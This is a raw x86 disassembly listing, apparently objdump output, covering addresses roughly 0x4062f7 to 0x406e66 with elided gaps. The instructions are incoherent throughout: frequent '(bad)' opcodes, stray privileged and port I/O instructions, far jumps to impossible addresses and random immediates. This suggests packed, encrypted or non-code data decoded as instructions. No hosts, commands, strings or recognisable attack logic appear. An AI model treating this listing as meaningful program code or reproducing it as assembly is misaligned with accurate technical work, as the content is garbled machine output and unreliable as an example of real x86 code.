  4062f7:	pop    eax
  4062f8:	bound  eax,QWORD PTR [esp+esi*1]
  4062fb:	imul   eax,DWORD PTR [ebx],0xc09a89af
  406301:	in     al,0x38
  406303:	pushf  
  406304:	mov    eax,DWORD PTR [edx+0x70]
  406307:	and    eax,DWORD PTR [bx+si+0x68]
  40630b:	lea    ebx,fs:[ebp+0x4c]
  40630f:	sbb    esi,DWORD PTR [ebx+0x565b7da9]
  406315:	add    DWORD PTR [ebx+0x6dea099c],eax
  40631b:	sar    eax,cl
  40631d:	fimul  DWORD PTR [ebx-0x7a2504c5]
  406323:	int    0x8c
  406325:	test   BYTE PTR [eax],0x0
	...
  406350:	xchg   edx,eax
  406351:	add    DWORD PTR [esi-0x39],ebx
  406354:	cmp    BYTE PTR ds:0x4e02282c,cl
  40635a:	add    esp,DWORD PTR [ebx]
  40635c:	mov    al,0x61
  40635e:	xor    esp,eax
  406360:	and    esp,DWORD PTR [edi+0x33]
  406363:	jecxz  0x40631e
  406365:	mov    edi,0xa5ff831f
  40636a:	jmp    0xc3dc8b59
  40636f:	fld    QWORD PTR [edx-0x7c]
  406372:	mov    eax,eax
  406374:	jmp    0x4063d7
  406376:	and    esi,DWORD PTR [ebx+0x658d63f3]
  40637c:	aas    
  40637d:	add    BYTE PTR [eax],dl
  40637f:	(bad)  
  406380:	out    dx,eax
  406381:	pop    edx
  406382:	inc    esi
  406383:	cmc    
  406384:	cld    
  406385:	fwait
  406386:	add    eax,0xfbd302ea
  40638b:	fiadd  DWORD PTR [ebp-0xbff06c6]
  406391:	lahf   
  406392:	lea    edx,[eax+ecx*4-0x6abbebf9]
  406399:	push   edi
  40639a:	push   esi
  40639b:	sub    dh,dl
  40639d:	xchg   ebp,eax
  40639e:	or     DWORD PTR [ebx],eax
  4063a0:	push   edi
  4063a1:	sar    al,1
  4063a3:	xor    ebx,DWORD PTR ds:0xef33fa78
  4063a9:	aad    0x8c
  4063ab:	movhps xmm7,QWORD PTR [ecx+0x1464d8a1]
  4063b2:	cmp    al,0xc1
	...
  4063dc:	add    BYTE PTR [eax],al
  4063de:	es push ecx
  4063e0:	add    ecx,edx
  4063e2:	fcomp  QWORD PTR [ebx+esi*1+0x339f34f9]
  4063e9:	cli    
  4063ea:	rol    dl,cl
  4063ec:	pop    ds
  4063ed:	enter  0x881c,0xe7
  4063f1:	add    edx,DWORD PTR [ecx+0x4bc3c14a]
  4063f7:	push   edi
  4063f8:	(bad)  [ebx+0x23fa683e]
  4063fe:	cmp    eax,0x9b8df868
  406403:	pop    esp
  406404:	out    0xcd,al
  406406:	ss jp  0x40640b
  406409:	inc    esi
  40640a:	dec    ebx
  40640b:	call   0xfb8b:0x972405c0
  406412:	and    al,0x9f
  406414:	and    edi,ecx
  406416:	and    al,0xa0
  406418:	lea    edx,[eax+ebx*1-0x5bc8f874]
  40641f:	push   esi
  406420:	push   esi
  406421:	cmp    BYTE PTR [esi-0x38fcf669],dl
  406427:	into   
  406428:	clc    
  406429:	xor    ebx,DWORD PTR [ebp-0x60cc058a]
  40642f:	aam    0x8c
  406431:	(bad)  
  406433:	in     eax,dx
  406434:	add    eax,0x4970cad5
  406439:	or     al,0x7f
  40643b:	mov    dl,0x9
  40643d:	add    eax,DWORD PTR [eax+ebp*8+0x33bc]
	...
  40646c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40646d:	nop
  40646e:	mov    ebx,0x96fea433
  406473:	pop    ds
  406474:	stos   DWORD PTR es:[edi],eax
  406475:	pop    edi
  406476:	pop    ebp
  406477:	inc    ebp
  406478:	cmp    eax,0x7dc0e39e
  40647d:	pop    edi
  40647e:	add    al,0xd9
  406480:	mov    ch,0xa
  406482:	hlt    
  406483:	cli    
  406484:	sbb    eax,0xc3f8f41a
  406489:	idiv   edi
  40648b:	add    al,0x57
  40648d:	adc    BYTE PTR [edx+0x3],ch
  406490:	clc    
  406491:	addr16 ret 0x43c0
  406495:	jno    0x40645b
  406497:	mov    edx,DWORD PTR [ebp-0x80]
  40649a:	mov    ebx,0xbc804723
  40649f:	lea    ebp,[edx+0x29a3bb64]
  4064a5:	push   edi
  4064a6:	add    al,0x56
  4064a8:	inc    esi
  4064a9:	xor    eax,ebp
  4064ab:	or     DWORD PTR ds:0x6df88c42,edi
  4064b1:	push   0x7a4dfae3
  4064b6:	mov    DWORD PTR [ecx+eax*2-0x5e90fd65],ecx
  4064bd:	jno    0x406504
  4064bf:	sbb    al,0xff
  4064c1:	mov    bl,0x6
  4064c3:	add    eax,DWORD PTR [edx+ebp*8]
  4064c6:	mov    ecx,0xbc51f733
  4064cb:	xor    esp,esp
  4064cd:	not    DWORD PTR [edi+0x1f]
	...
  4064f7:	add    BYTE PTR [eax],al
  4064f9:	add    BYTE PTR [esi+edi*1+0x5b3d8cea],dh
  406500:	inc    edi
  406501:	hlt    
  406502:	(bad)  
  406503:	cwde   
  406504:	cmc    
  406505:	add    ah,bh
  406507:	rcl    BYTE PTR [eax-0x6dd7380d],1
  40650d:	mov    edx,eax
  40650f:	push   esp
  406510:	sub    edi,ebp
  406512:	mov    bh,0x5c
  406514:	jmp    0x3d00:0xa99a523d
  40651b:	cwde   
  40651c:	bound  edi,QWORD PTR [ebx-0x43e59db3]
  406522:	ret    
  406523:	(bad)  
  406524:	test   BYTE PTR [eax+edx*4-0x17fc9216],0x3a
  40652c:	sub    dl,al
  40652e:	inc    ebp
  40652f:	pop    eax
  406530:	sbb    DWORD PTR [ebx-0xcbdd78a],ecx
  406536:	addr16 into 
  406538:	gs pop es
  40653a:	sbb    al,0xfa
  40653c:	dec    ebx
  40653d:	sub    DWORD PTR ds:0x7fc4d50d,edi
  406543:	dec    ebx
  406544:	jmp    0xdbb:0xda61b5c9
  40654b:	bound  ebx,QWORD PTR [eax+ebx*4+0x59]
  40654f:	dec    edi
  406550:	shl    DWORD PTR [eax-0x460a7cd],0xfe
  406557:	xchg   edi,eax
  406558:	fiadd  WORD PTR [edx]
  40655a:	pop    es
  40655b:	shl    al,1
  40655d:	repnz add BYTE PTR [eax],al
	...
  406588:	pop    ss
  406589:	sub    dl,ah
  40658b:	mov    BYTE PTR [edx-0x3755daad],bh
  406591:	mov    dh,0xea
  406593:	cmp    eax,0xffa99a3a
  406598:	cmp    al,0x98
  40659a:	jb     0x406556
  40659c:	sub    eax,0xbbbbfa62
  4065a1:	mov    BYTE PTR [eax],0xde
  4065a4:	push   edx
  4065a5:	mov    esi,ds
  4065a7:	and    bh,BYTE PTR ds:0xffa81005
  4065ad:	dec    edi
  4065ae:	add    edi,DWORD PTR [ecx-0x6dcc9d4c]
  4065b4:	int3   
  4065b5:	popa   
  4065b6:	lea    ebx,[ebp+0x40]
  4065b9:	sti    
  4065ba:	dec    edx
  4065bb:	inc    edx
  4065bc:	jecxz  0x406615
  4065be:	dec    esi
  4065bf:	fld    QWORD PTR [edx+0x77ea1099]
  4065c5:	iret   
  4065c6:	cli    
  4065c7:	mov    edx,0x74f927d5
  4065cc:	test   eax,0x109d703b
  4065d1:	popf   
  4065d2:	add    esi,DWORD PTR [edi-0x93c656b]
  4065d8:	cmp    al,0x82
  4065da:	mov    eax,DWORD PTR [eax+0x6c]
  4065dd:	popa   
  4065de:	xor    eax,DWORD PTR [edx-0x4a]
  4065e1:	(bad)  
  4065e2:	pop    es
  4065e3:	das    
  4065e4:	sub    eax,eax
  4065e6:	sub    dl,ch
  4065e8:	sbb    esp,DWORD PTR [edi]
  4065ea:	shr    DWORD PTR [ecx],0x0
	...
  406615:	add    BYTE PTR [ecx+0x58],dl
  406618:	ret    
  406619:	jb     0x40659f
  40661b:	daa    
  40661c:	stc    
  40661d:	fiadd  DWORD PTR [ebp-0x8096b33]
  406623:	and    BYTE PTR [ecx-0x3e8ec3ed],0x2b
  40662a:	xor    al,0x5e
  40662c:	shl    BYTE PTR [edx-0x1b],1
  40662f:	mov    ?,ebx
  406631:	mov    edx,0xf68be8d7
  406636:	nop
  406637:	mov    ebp,edi
  406639:	mov    ch,0x3f
  40663b:	test   eax,0x6bfda80c
  406640:	add    esp,DWORD PTR [ebx+0x3355c7]
  406646:	dec    DWORD PTR [eax+edi*8-0x73]
  40664a:	mov    esi,DWORD PTR [eax+0x5]
  40664d:	sbb    eax,0x5e035b5f
  406652:	out    dx,eax
  406653:	sbb    eax,0x35e417c3
  406658:	mov    edi,ecx
  40665a:	in     al,0x14
  40665c:	xor    edi,ebx
  40665e:	pop    edx
  40665f:	fild   DWORD PTR [esi]
  406661:	cmp    edi,esi
  406663:	sub    ebx,ecx
  406665:	add    esp,DWORD PTR [ecx+0x3b]
  406668:	rol    al,0xa3
  40666b:	pop    ebx
  40666c:	ret    
  40666d:	mov    ebp,DWORD PTR [esp+ecx*2]
  406670:	clc    
  406671:	xor    ecx,DWORD PTR [edi]
  406673:	loop   0x406608
  406675:	pop    ss
  406676:	add    dh,dh
  406678:	(bad)  
	...
  4066a2:	add    BYTE PTR [eax],al
  4066a4:	xchg   esp,eax
  4066a5:	test   al,0x30
  4066a7:	rcl    DWORD PTR [ebp+0x64],0x3
  4066ab:	rcr    ah,1
  4066ad:	push   ss
  4066ae:	xor    edi,ebx
  4066b0:	je     0x4066c6
  4066b2:	lea    ecx,[eax+ebx*2-0x775d83ea]
  4066b9:	pop    ebx
  4066ba:	dec    esi
  4066bb:	cmp    al,0x26
  4066bd:	push   ds
  4066be:	adc    BYTE PTR [ebx],al
  4066c0:	or     eax,0x1f33f9e4
  4066c5:	dec    esp
  4066c6:	clc    
  4066c7:	(bad)  
  4066c8:	retf   
  4066c9:	outs   dx,DWORD PTR ds:[esi]
  4066ca:	gs push esi
  4066cc:	jnp    0x4066e9
  4066ce:	add    ebx,DWORD PTR [esi+0x2f]
  4066d1:	sbb    eax,0x351417c3
  4066d6:	mov    edi,0xff0f28ff
  4066db:	xor    ecx,DWORD PTR ds:0x1e33fb63
  4066e1:	loope  0x406666
  4066e3:	pop    es
  4066e4:	arpl   WORD PTR ds:0x453ef428,di
  4066ea:	std    
  4066eb:	sar    dh,0x41
  4066ee:	add    bl,al
  4066f0:	mov    cl,0x20
  4066f2:	mov    ah,0xff
  4066f4:	jmp    0xe64c214d
  4066f9:	push   esp
  4066fa:	mov    eax,0x8c30b28d
  4066ff:	jmp    DWORD PTR [eax*4+0x32a5601]
  406706:	ror    DWORD PTR [edx],0x0
	...
  406731:	add    BYTE PTR ds:0xb9ff7414,bh
  406737:	call   0x4cf59aef
  40673c:	mov    ecx,0x87c6a633
  406741:	psubusw mm4,QWORD PTR [edi+ecx*4]
  406745:	stos   DWORD PTR es:[edi],eax
  406746:	cmp    eax,0x7fc0fc7a
  40674b:	push   eax
  40674c:	add    dl,cl
  40674e:	leave  
  40674f:	mov    eax,0x7481ffb4
  406754:	mov    esp,0xba74770b
  406759:	(bad)  
  40675a:	rol    BYTE PTR [eax-0x6],cl
  40675d:	lahf   
  40675e:	int    0x97
  406760:	add    BYTE PTR [esi+0x4a],bl
  406763:	add    eax,0x15
  406766:	cmp    eax,0x51ff746b
  40676b:	xor    BYTE PTR [ebx+esi*1+0x33b84c44],0x47
  406773:	mov    esi,0xbfd077f
  406778:	pop    eax
  406779:	gs cmp eax,0xfec0f308
  40677f:	inc    eax
  406780:	add    bl,al
  406782:	loope  0x4067d5
  406784:	mov    bl,0xff
  406786:	sbb    DWORD PTR [esi],edx
  406788:	mov    edx,0x1a5c160b
  40678d:	scas   eax,DWORD PTR es:[edi]
  40678e:	mov    ebx,0xf295f5ef
  406793:	addr16 popw es
	...
  4067be:	add    BYTE PTR [eax],al
  4067c0:	nop
  4067c1:	addr16 test al,0xc6
  4067c4:	inc    esp
  4067c5:	pop    esp
  4067c6:	cdq    
  4067c7:	jae    0x4067b2
  4067c9:	pop    eax
  4067ca:	mov    esi,0xe2542db3
  4067cf:	lods   eax,DWORD PTR ds:[esi]
  4067d0:	or     eax,0x41805c53
  4067d5:	(bad)  
  4067d6:	popf   
  4067d7:	mov    ds:0xdc2f5cc9,eax
  4067dc:	(bad)  
  4067dd:	sbb    ah,dh
  4067df:	push   es
  4067e0:	test   BYTE PTR [eax],bl
  4067e2:	mov    ?,WORD PTR [ebx-0x5445a74f]
  4067e8:	xor    eax,0xb3adba52
  4067ed:	not    ebp
  4067ef:	aam    0xfb
  4067f1:	fisub  WORD PTR [ebx+0x7]
  4067f4:	lock pop esi
  4067f6:	sub    bh,al
  4067f8:	xor    ebx,DWORD PTR [eax+eax*2+0x73]
  4067fc:	sbb    DWORD PTR [eax+0x56],0xe2552db3
  406803:	scas   al,BYTE PTR es:[edi]
  406804:	sub    eax,0x41887452
  406809:	test   al,0xbf
  40680b:	pop    ebx
  40680c:	rcr    DWORD PTR [ebx-0x51],1
  40680f:	jecxz  0x40688f
  406811:	sbb    esp,edi
  406813:	push   es
  406814:	jge    0x40682e
  406816:	es mov bl,0x49
  406819:	pop    eax
  40681a:	fisubr DWORD PTR [ebp+esi*1-0x345125ad]
  406821:	out    dx,al
  406822:	cmc    
  406823:	mov    ds:0x0,eax
	...
  40684c:	add    BYTE PTR [eax],al
  40684e:	sbb    BYTE PTR [edi-0x686ff8f9],al
  406854:	sub    dh,al
  406856:	xor    al,0x5c
  406858:	add    BYTE PTR [ecx],bl
  40685a:	lea    ebx,[eax-0x1]
  40685d:	out    dx,al
  40685e:	int3   
  40685f:	mov    edi,ebx
  406861:	repnz fisttp DWORD PTR [ebx+0x68816cf8]
  406868:	adc    al,0x2a
  40686a:	inc    ebx
  40686b:	cld    
  40686c:	add    bl,BYTE PTR [edi]
  40686e:	inc    edx
  40686f:	sbb    al,cl
  406871:	test   BYTE PTR [eax+0x25],0xbf
  406875:	mov    esi,0xfaff57ac
  40687a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40687b:	arpl   cx,di
  40687d:	cli    
  40687e:	mov    ds:0x63069be5,eax
  406883:	push   0x8
  406885:	das    
  406886:	cmp    DWORD PTR [ecx+0x6d80a834],edi
  40688c:	add    esi,DWORD PTR [eax-0x7900a7d4]
  406892:	in     al,dx
  406893:	mov    edi,edx
  406895:	repnz ror BYTE PTR [ebx+0x5fc164f9],1
  40689c:	sub    bh,0xe8
  40689f:	dec    edi
  4068a0:	add    ebp,DWORD PTR [edi-0x183fe5d3]
  4068a6:	cmp    BYTE PTR [edi+edi*4],bl
  4068a9:	push   esi
  4068aa:	lods   al,BYTE PTR ds:[esi]
  4068ab:	push   edi
  4068ac:	call   FWORD PTR [edx]
  4068ae:	mov    ds:0xfaf863,eax
	...
  4068db:	add    BYTE PTR [eax+0x66d693e5],bl
  4068e1:	dec    ecx
  4068e2:	cmp    dh,BYTE PTR [eax+eax*2-0x4f]
  4068e6:	sub    al,0x28
  4068e8:	jnp    0x40694e
  4068ea:	add    edi,DWORD PTR [ecx]
  4068ec:	int3   
  4068ed:	push   edi
  4068ee:	call   FWORD PTR [esi]
  4068f0:	mov    WORD PTR [ebx-0x75141d05],cs
  4068f6:	clc    
  4068f7:	pop    esp
  4068f8:	mov    cl,0x66
  4068fa:	mov    ebx,0x2a314500
  4068ff:	add    edx,ecx
  406901:	push   edx
  406902:	rol    cl,0x20
  406905:	pop    esi
  406906:	retf   0x20bf
  406909:	or     eax,0x724ffff
  40690e:	or     edi,ecx
  406910:	and    al,0x5
  406912:	lea    ebx,[eax+esi*8-0x3792d17]
  406919:	pusha  
  40691a:	pop    esi
  40691b:	and    al,0x96
  40691d:	and    BYTE PTR ds:0x7dd89e03,dl
  406923:	or     dh,ah
  406925:	arpl   WORD PTR [ecx],ax
  406927:	pop    edi
  406928:	fistp  DWORD PTR [ecx+0x4f]
  40692b:	or     dh,dl
  40692d:	mov    bl,0xc
  40692f:	call   DWORD PTR [edx]
  406931:	or     ecx,DWORD PTR [ebp-0x76a3988a]
  406937:	bswap  ebp
  406939:	or     al,0xff
  40693b:	pop    edx
  40693c:	pop    esi
  40693d:	test   al,0x58
  40693f:	pop    edi
	...
  406968:	add    BYTE PTR [eax],al
  40696a:	inc    ecx
  40696b:	adc    al,dl
  40696d:	or     al,0xa7
  40696f:	lods   eax,DWORD PTR ds:[esi]
  406970:	mov    ebp,esp
  406972:	and    al,0x23
  406974:	clc    
  406975:	push   edi
  406976:	leave  
  406977:	scas   eax,DWORD PTR es:[edi]
  406978:	mov    DWORD PTR [ebp-0x1d],0x6700005e
  40697f:	or     esi,DWORD PTR [ebp+0xc]
  406982:	adc    BYTE PTR [esi-0x65a53808],bl
  406988:	lea    eax,[ecx+0x57]
  40698b:	pop    ecx
  40698c:	and    eax,DWORD PTR [ebp-0x78]
  40698f:	and    eax,DWORD PTR ds:0x99f244
  406995:	mov    esp,ebp
  406997:	adc    eax,0x925ac7ef
  40699c:	lea    eax,[ecx+0x3e]
  40699f:	inc    esp
  4069a0:	mov    cl,0xdc
  4069a2:	hlt    
  4069a3:	retf   
  4069a4:	leave  
  4069a5:	add    eax,0x43cf7a
  4069aa:	test   al,0xf0
  4069ac:	hlt    
  4069ad:	sgdtd  [edi+0x53]
  4069b1:	lea    edi,[edi+0x44]
  4069b4:	mov    bl,0xe1
  4069b6:	in     al,dx
  4069b7:	add    BYTE PTR [esp+ebx*1+0x2fc7eb5],bl
  4069be:	xor    DWORD PTR [eax],0x1d
  4069c1:	inc    eax
  4069c2:	xchg   ax,ax
  4069c4:	jg     0x406a07
  4069c6:	ds je  0x406965
  4069c9:	inc    eax
  4069ca:	fist   DWORD PTR [eax+esi*4]
  4069cd:	add    DWORD PTR [eax],0x0
	...
  4069f8:	adc    DWORD PTR [eax],0x43
  4069fb:	call   0x43ae02
  406a00:	mov    ebp,0x4d40ac6e
  406a05:	push   ss
  406a06:	jl     0x406a65
  406a08:	mov    dh,0xc0
  406a0a:	les    eax,FWORD PTR [eax-0x3b]
  406a0d:	jle    0x406a0b
  406a0f:	add    al,BYTE PTR [ebx]
  406a11:	loopne 0x406a66
  406a13:	push   0x42c70a
  406a18:	out    dx,al
  406a19:	fisttp DWORD PTR [ecx]
  406a1b:	in     eax,0x91
  406a1d:	les    eax,FWORD PTR [edx]
  406a1f:	pop    ebp
  406a20:	mov    al,BYTE PTR [ebp+0x2b35484]
  406a26:	add    eax,DWORD PTR [eax+0x75f898bd]
  406a2c:	push   ebp
  406a2d:	rcr    DWORD PTR [eax+ecx*1-0x5c7cb60e],0xca
  406a35:	mov    BYTE PTR [edx+0x0],0x3e
  406a39:	add    DWORD PTR [ebx],ebp
  406a3b:	mul    BYTE PTR [esi-0x48]
  406a3e:	add    eax,DWORD PTR [eax]
  406a40:	ds pop ebx
  406a42:	bound  edi,QWORD PTR [ebx-0x63e1aabf]
  406a48:	cmp    al,0xcf
  406a4a:	jecxz  0x4069cf
  406a4c:	fucom  st(7)
  406a4e:	pop    ebx
  406a4f:	inc    edx
  406a50:	ds pop ebx
  406a52:	stos   BYTE PTR es:[edi],al
  406a53:	sub    ebp,DWORD PTR [eax]
  406a55:	loope  0x4069fa
  406a57:	call   esi
  406a59:	arpl   cx,bp
  406a5b:	add    eax,DWORD PTR [eax]
	...
  406a85:	add    BYTE PTR [esi],bh
  406a87:	mov    BYTE PTR [ebx],bl
  406a89:	mov    eax,0xffb1651f
  406a8e:	idiv   eax
  406a90:	js     0x406a13
  406a92:	jg     0x406aef
  406a94:	pusha  
  406a95:	sbb    edx,eax
  406a97:	out    0x27,al
  406a99:	add    al,0xd6
  406a9b:	mov    bl,0xe9
  406a9d:	add    edi,DWORD PTR [esi]
  406a9f:	cli    
  406aa0:	sub    BYTE PTR [ecx+0x19625b7f],al
  406aa6:	jp     0x406a8e
  406aa8:	daa    
  406aa9:	add    al,0xb5
  406aab:	xor    WORD PTR [ecx-0x4411a481],ax
  406ab2:	dec    ecx
  406ab3:	and    esi,esp
  406ab5:	mov    esp,0x455c9bdd
  406aba:	ds loop 0x406a98
  406abd:	inc    edi
  406abe:	mov    bl,0x9a
  406ac0:	jmp    0x64e3b641
  406ac5:	inc    ebp
  406ac6:	ds cli 
  406ac8:	sbb    al,0x81
  406aca:	call   FWORD PTR [edx+0x72]
  406acd:	sbb    esi,ebp
  406acf:	in     eax,0xa7
  406ad1:	add    ecx,DWORD PTR [ecx+0x23]
  406ad4:	out    0xb9,al
  406ad6:	popf   
  406ad7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ad8:	pop    esp
  406ad9:	inc    ebp
  406ada:	ds loop 0x406ab8
  406add:	push   ebx
  406ade:	mov    bl,0x9a
  406ae0:	jmp    0x949cfe
  406ae5:	mov    esp,0x5c40c32d
	...
  406b12:	add    BYTE PTR [eax],al
  406b14:	add    ebx,DWORD PTR [ebx-0x18]
  406b17:	fwait
  406b18:	cdq    
  406b19:	push   esp
  406b1a:	inc    edx
  406b1c:	mov    esi,DWORD PTR [ecx+ecx*8+0x555b3e2b]
  406b23:	(bad)  
  406b24:	(bad)  
  406b26:	ret    
  406b27:	add    DWORD PTR [ebx-0x170100ad],edx
  406b2d:	fild   WORD PTR [ebx]
  406b2f:	and    al,0xb6
  406b31:	in     eax,0x40
  406b33:	jmp    0x820ddabc
  406b38:	mov    esi,0xb5ee0099
  406b3d:	arpl   dx,cx
  406b3f:	pusha  
  406b40:	cmp    DWORD PTR [esi],esp
  406b42:	xchg   esp,eax
  406b43:	pop    esp
  406b44:	sbb    BYTE PTR [ebx-0x77],0xdd
  406b48:	(bad)  
  406b49:	repnz mov WORD PTR [eax],gs
  406b4c:	inc    edx
  406b4d:	call   0xaeff:0x1b629475
  406b54:	cwde   
  406b55:	fild   WORD PTR [ebx]
  406b57:	je     0x406b9e
  406b59:	in     eax,0x40
  406b5b:	jmp    0x1dcdda94
  406b60:	xor    BYTE PTR [edx-0x19be2600],bl
  406b66:	pop    ebx
  406b67:	ja     0x406b63
  406b69:	pop    edx
  406b6a:	xor    edx,ebp
  406b6c:	mov    esi,0x3a288eae
  406b71:	mov    dl,al
  406b73:	cwde   
  406b74:	jge    0x406b57
  406b76:	add    esi,DWORD PTR [eax+eax*1+0x0]
	...
  406ba2:	test   eax,0x2e940e4
  406ba7:	into   
  406ba8:	(bad)  
  406ba9:	bound  ecx,QWORD PTR [esi-0x65]
  406bac:	lea    ebp,[eax+0x34e03d]
  406bb2:	xchg   ebx,eax
  406bb3:	fiadd  DWORD PTR [eax+0x0]
  406bb6:	int3   
  406bb7:	dec    edx
  406bb8:	inc    edi
  406bb9:	lea    esp,[esi-0x54ca00a9]
  406bbf:	fiadd  DWORD PTR [eax+0x0]
  406bc2:	enter  0xfca2,0xff
  406bc6:	adc    ch,BYTE PTR [edi-0x2dd8be73]
  406bcc:	inc    ebp
  406bcd:	clc    
  406bce:	mov    ?,edx
  406bd0:	(bad)  
  406bd1:	(bad)  
  406bd2:	cmp    ch,dl
  406bd4:	(bad)  
  406bd5:	mov    esp,DWORD PTR [eax+0x9]
  406bd8:	shl    BYTE PTR [ebx],cl
  406bda:	popa   
  406bdb:	cmp    eax,0x1d1cfc54
  406be0:	add    eax,DWORD PTR [edx+ecx*4]
  406be3:	ret    
  406be4:	lea    eax,[ecx-0x19]
  406be7:	pop    ebx
  406be8:	inc    ebp
  406be9:	clc    
  406bea:	loop   0x406bd1
  406bec:	js     0x406b70
  406bee:	sub    eax,0x68fc7500
  406bf3:	call   0xc6c1:0xb1a89f8
  406bfa:	jmp    0x84cc6ad2
  406bff:	push   ds
  406c00:	ret    
  406c01:	add    eax,0x754126d4
	...
  406c2e:	add    BYTE PTR [eax],al
  406c30:	jmp    0x406bf8
  406c32:	in     al,dx
  406c33:	dec    eax
  406c35:	add    BYTE PTR [ebx+0x33281cc6],cl
  406c3b:	inc    ebp
  406c3c:	mov    ebx,0xa303c14c
  406c41:	shl    esp,1
  406c43:	lea    esp,[esi+0x57]
  406c46:	add    eax,DWORD PTR [ebp+0xf]
  406c49:	pop    edx
  406c4a:	mov    eax,ds:0xff70feeb
  406c4f:	jne    0x406c6c
  406c51:	rol    BYTE PTR [ebp-0x8],1
  406c54:	ds mov ebx,0x7a7ffc2f
  406c5a:	push   cs
  406c5b:	mov    esp,DWORD PTR [eax-0x33]
  406c5e:	mov    cl,0xc1
  406c60:	jge    0x406c99
  406c62:	add    al,bl
  406c64:	dec    DWORD PTR [esi]
  406c66:	sar    DWORD PTR [ecx-0x527ea6],cl
  406c6c:	mov    ch,0x81
  406c6e:	jns    0x406cc5
  406c70:	cmp    cl,BYTE PTR [ebp+0x46]
  406c73:	cld    
  406c74:	pop    ebp
  406c75:	xchg   ecx,eax
  406c76:	loope  0x406c3d
  406c78:	xor    eax,0xb3040186
  406c7d:	(bad)  
  406c7e:	jl     0x406cc1
  406c80:	ds inc ebp
  406c82:	inc    esi
  406c83:	clc    
  406c84:	cmp    ebp,DWORD PTR [eax+0x70]
  406c87:	sbb    edi,DWORD PTR [ecx-0x4e03c9c0]
  406c8d:	jle    0x406c3b
  406c8f:	mov    DWORD PTR [ebx+0x30],edi
  406c92:	ret    0xc6
	...
  406cbd:	add    BYTE PTR [eax-0x43],dl
  406cc0:	lods   eax,DWORD PTR ds:[esi]
  406cc1:	mov    ebp,ebp
  406cc3:	add    al,al
  406cc5:	add    eax,0x7541fc3d
  406cca:	add    eax,0xd1ff9edb
  406ccf:	or     BYTE PTR [eax-0x3a],bh
  406cd2:	mov    ch,0xe8
  406cd4:	out    dx,eax
  406cd5:	inc    esp
  406cd6:	ret    0xc134
  406cd9:	add    eax,DWORD PTR [edx-0x41]
  406cdc:	xchg   edi,eax
  406cdd:	mov    ?,edi
  406cdf:	inc    ebx
  406ce0:	add    BYTE PTR [ebp-0x5a],al
  406ce3:	ss aad 0xc1
  406ce6:	sbb    al,0xe
  406ce8:	lods   al,BYTE PTR ds:[esi]
  406ce9:	jne    0x406c85
  406ceb:	rol    BYTE PTR [esi-0x8],0xc7
  406cef:	inc    esi
  406cf0:	scas   eax,DWORD PTR es:[edi]
  406cf1:	rol    DWORD PTR [eax-0x4a0187df],0x5a
  406cf8:	pop    edx
  406cf9:	ret    0x577d
  406cfc:	jmp    0x4b02:0x39c7ffcb
  406d03:	fwait
  406d04:	pop    esp
  406d05:	inc    edx
  406d06:	ds pop esp
  406d08:	cld    
  406d09:	inc    edi
  406d0a:	retf   
  406d0b:	fwait
  406d0c:	jmp    0x64e38013
  406d11:	inc    edx
  406d12:	ds out 0xa3,al
  406d15:	scas   eax,DWORD PTR es:[edi]
  406d16:	aas    
  406d17:	pop    eax
  406d18:	mov    ch,0x7e
  406d1a:	jg     0x406d77
  406d1c:	jb     0x406d64
  406d1e:	ss pop ebx
  406d20:	in     al,dx
  406d21:	push   ebx
	...
  406d4a:	add    BYTE PTR [eax],al
  406d4c:	mov    ebx,0xfdbae99a
  406d51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d52:	jb     0x406cf3
  406d54:	sbb    edi,eax
  406d56:	icebp  
  406d57:	fwait
  406d58:	pop    eax
  406d59:	and    cl,ch
  406d5b:	add    edi,DWORD PTR [ebp+0x5835ee53]
  406d61:	push   eax
  406d62:	pop    esp
  406d63:	cld    
  406d64:	loope  0x406dd6
  406d66:	scas   al,BYTE PTR es:[edi]
  406d67:	add    al,0x3e
  406d69:	fs test eax,0xce134131
  406d6f:	stos   DWORD PTR es:[edi],eax
  406d70:	loope  0x406dc2
  406d72:	rcl    BYTE PTR [edi],cl
  406d74:	lds    ebx,FWORD PTR [ebx+0x1b4593ed]
  406d7a:	cmp    al,0x3
  406d7c:	xchg   BYTE PTR [eax-0x52],dl
  406d7f:	stos   DWORD PTR es:[edi],eax
  406d80:	rol    DWORD PTR [ebp+ebp*8+0x7e],0x3e
  406d85:	in     al,0xe8
  406d87:	mov    esp,0x50e9577c
  406d8c:	mov    ch,0x3f
  406d8e:	push   0xffffffc0
  406d90:	scas   al,BYTE PTR es:[edi]
  406d91:	lods   al,BYTE PTR ds:[esi]
  406d92:	mov    edx,0x135924ce
  406d97:	add    eax,0x81005d24
  406d9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d9d:	and    DWORD PTR [eax],eax
  406d9f:	jmp    0xdd3fc15c
  406da4:	inc    ebx
  406da5:	inc    esp
  406da6:	bound  esi,QWORD PTR [edx-0x7e]
  406da9:	lds    edx,FWORD PTR [eax]
  406dab:	dec    DWORD PTR fs:[edx+0x50]
  406daf:	inc    ecx
	...
  406dd8:	add    BYTE PTR [eax],al
  406dda:	pop    ds
  406ddb:	cmp    eax,0x181c46ff
  406de0:	inc    ebp
  406de1:	cmp    DWORD PTR [eax],edi
  406de3:	pop    ebx
  406de4:	mov    esp,DWORD PTR [ebp+ebp*1-0x3d383327]
  406deb:	popf   
  406dec:	repnz push 0x67
  406def:	pop    edi
  406df0:	add    BYTE PTR [ebp-0x1abb1bc2],dl
  406df6:	enter  0x836f,0x8c
  406dfa:	sub    DWORD PTR [eax+0x74],edx
  406dfd:	repz ror ch,0x8
  406e01:	jmp    0xcd2bc554
  406e06:	test   al,0x5f
  406e08:	push   DWORD PTR [ebp+eax*1+0x38]
  406e0c:	ins    BYTE PTR es:[edi],dx
  406e0d:	out    0xa4,al
  406e0f:	dec    edi
  406e10:	and    ecx,0xffffffa4
  406e13:	lds    eax,FWORD PTR [edx]
  406e15:	ret    0xe239
  406e18:	inc    esp
  406e19:	aad    0x43
  406e1b:	imul   ecx,DWORD PTR [ebp+0x53aa922c],0xffffffd1
  406e22:	ret    0x20
  406e25:	jmp    0x353fc0ea
  406e2a:	ret    0xe8ac
  406e2d:	jge    0x406e26
  406e2f:	pop    edx
  406e30:	add    dl,bl
  406e32:	and    bl,0xc2
  406e35:	xor    ch,bl
  406e37:	sbb    al,0xc
  406e39:	jmp    0x12c524c
	...
  406e66:	add    BYTE PTR [eax],al
